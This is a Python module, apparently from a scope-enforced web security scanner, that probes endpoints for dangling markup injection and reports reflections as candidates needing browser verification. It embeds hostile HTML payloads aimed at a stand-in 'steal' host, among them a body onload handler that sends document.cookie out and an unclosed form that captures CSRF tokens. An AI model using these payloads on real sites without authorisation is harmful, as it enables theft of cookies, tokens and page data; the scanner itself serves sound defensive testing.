"""Dangling Markup Injection scanner — HTML injection without script execution, data exfiltration via form/attribute hijack."""
from __future__ import annotations
import asyncio
import random
import re
import string
from typing import Any
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

DANGLING_CANARY_PREFIX = "TLSMDANGLE"

DANGLING_ENDPOINTS = [
    "/search", "/api/search",
    "/api/profile", "/api/user",
    "/api/comment", "/api/post",
    "/api/message", "/api/feedback",
    "/api/contact", "/api/submit",
    "/login", "/register", "/signup",
    "/api/login", "/api/register",
    "/api/config", "/api/debug",
]

DANGLING_PAYLOADS = [
    # Classic dangling markup — captures content until next matching quote
    ('<img src="https://talisman.invalid/steal?data=', "Img src dangling markup"),
    ('<form action="https://talisman.invalid/steal"><input name="data" value="', "Form input value dangling markup"),
    ('<a href="https://talisman.invalid/steal?data=', "Anchor href dangling markup"),
    ('<iframe src="https://talisman.invalid/steal?data=', "Iframe src dangling markup"),
    ('<frame src="https://talisman.invalid/steal?data=', "Frame src dangling markup"),
    ('<input type="hidden" name="csrf" value="', "Hidden input value dangling markup"),
    ('<meta http-equiv="refresh" content="0;url=https://talisman.invalid/steal?data=', "Meta refresh dangling markup"),
    # CSS background URL capture
    ('<style>body{background:url("https://talisman.invalid/steal?data=', "CSS background URL dangling markup"),
    # Link tag
    ('<link rel="stylesheet" href="https://talisman.invalid/steal?data=', "Link href dangling markup"),
    # Script-less event handler
    ('<body onload="fetch(\'https://talisman.invalid/steal?data=\'+document.cookie)">', "Body onload data exfil (no script tag)"),
]


async def _test_dangling_markup(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test for dangling markup injection.

    The technique: inject an unclosed HTML tag attribute that captures
    subsequent page content until the next matching quote character.
    """
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint
    canary = f"{DANGLING_CANARY_PREFIX}{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"

    for payload, description in DANGLING_PAYLOADS:
        # Add a unique canary so we can identify our injection
        test_payload = payload.replace("steal?data=", f"steal?data={canary}_")

        test_variants = [
            {"q": test_payload},
            {"search": test_payload},
            {"query": test_payload},
            {"name": test_payload},
            {"input": test_payload},
            {"comment": test_payload},
            {"message": test_payload},
            {"feedback": test_payload},
            {"data": test_payload},
            {"url": test_payload},
            {"redirect": test_payload},
            {"next": test_payload},
        ]

        for params in test_variants:
            try:
                r = await client.get(test_url, params=params, timeout=8)
                resp_text = r.text

                # Check 1: Is our payload reflected?
                if canary not in resp_text:
                    continue

                # Check 2: Did the injection capture content (dangling markup)?
                # Look for our canary followed by non-trivial content before a quote
                dangling_pattern = re.escape(f"{canary}_") + r"([^\"'>]+)"
                match = re.search(dangling_pattern, resp_text)
                if match:
                    captured = match.group(1)
                    # If we captured more than just our marker, dangling markup succeeded
                    param_name = list(params.keys())[0]

                    findings.append({
                        "type": "dangling_markup",
                        "endpoint": endpoint,
                        "payload_preview": payload[:60],
                        "description": description,
                        "canary": canary,
                        "param": param_name,
                        "evidence": f"Dangling markup capture: '...{canary}_{captured[:80]}...'",
                    })
                    break

            except Exception:
                pass

        if findings and any(f.get("canary") == canary for f in findings):
            break

    return findings


async def _test_dangling_form_hijack(
    url: str, endpoint: str, client: TalismanHTTPClient,
) -> list[dict[str, Any]]:
    """Test dangling markup via form hijacking — inject unclosed form tag that captures CSRF tokens."""
    findings: list[dict[str, Any]] = []
    test_url = url.rstrip("/") + endpoint
    canary = f"{DANGLING_CANARY_PREFIX}_FORM{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"

    # Form hijacking payload: start a form that points to evil.com
    # and leave it unclosed to capture subsequent form fields
    form_payload = f'<form id="{canary}" action="https://talisman.invalid/steal"><input type="hidden" name="csrf_token" value="'

    try:
        r = await client.get(test_url, params={"q": form_payload}, timeout=8)
        resp_text = r.text

        if canary in resp_text:
            # Check if the CSRF token (or any value) was captured between our
            # dangling value attribute and the next quote
            pattern = re.escape(canary) + r'.*?value="([^"<>]+)"'
            match = re.search(pattern, resp_text, re.DOTALL)
            if match:
                captured_value = match.group(1)
                findings.append({
                    "type": "form_hijack",
                    "endpoint": endpoint,
                    "canary": canary,
                    "evidence": f"Form hijack payload captured value: '{captured_value[:80]}'",
                })
    except Exception:
        pass

    return findings


async def run(
    target: str,
    session: Any = None,
    scope: Any = None,
    rate_limiter: Any = None,
    proxy: str | None = None,
    **kwargs: Any,
) -> dict[str, Any]:
    """Identify reflection candidates; browser-side capture is not inferred."""
    url = target if "://" in target else f"https://{target}"
    if scope is None:
        return {
            "target": url, "findings": [], "candidates": [], "count": 0,
            "candidate_count": 0, "error": "scope_enforcer_required",
        }
    scope.assert_in_scope(url)

    console.print(
        f"\n[module][+] Dangling Markup Candidate Scanner[/module] -> [target]{url}[/target]"
    )
    candidates: list[dict[str, Any]] = []

    async with TalismanHTTPClient(proxy=proxy, timeout=12, scope=scope) as client:
        for endpoint in DANGLING_ENDPOINTS:
            for candidate in await _test_dangling_markup(url, endpoint, client):
                candidates.append({
                    **candidate,
                    "confidence": "candidate",
                    "requires_browser_verification": True,
                    "verification_required": (
                        "Confirm the reflected bytes form executable HTML in the "
                        "relevant browser context, then demonstrate a controlled "
                        "same-origin canary capture. Reflection alone does not "
                        "prove dangling-markup execution or data exfiltration."
                    ),
                })

            for candidate in await _test_dangling_form_hijack(url, endpoint, client):
                candidates.append({
                    **candidate,
                    "confidence": "candidate",
                    "requires_browser_verification": True,
                    "verification_required": (
                        "The response must be parsed by a browser and shown to "
                        "capture a non-sensitive test canary. A reflected form "
                        "element does not prove that a CSRF token was captured."
                    ),
                })

    console.print(
        f"  Dangling-markup scan complete -- {len(candidates)} candidates require browser verification"
    )
    return {
        "target": url,
        "findings": [],
        "candidates": candidates,
        "count": 0,
        "candidate_count": len(candidates),
    }
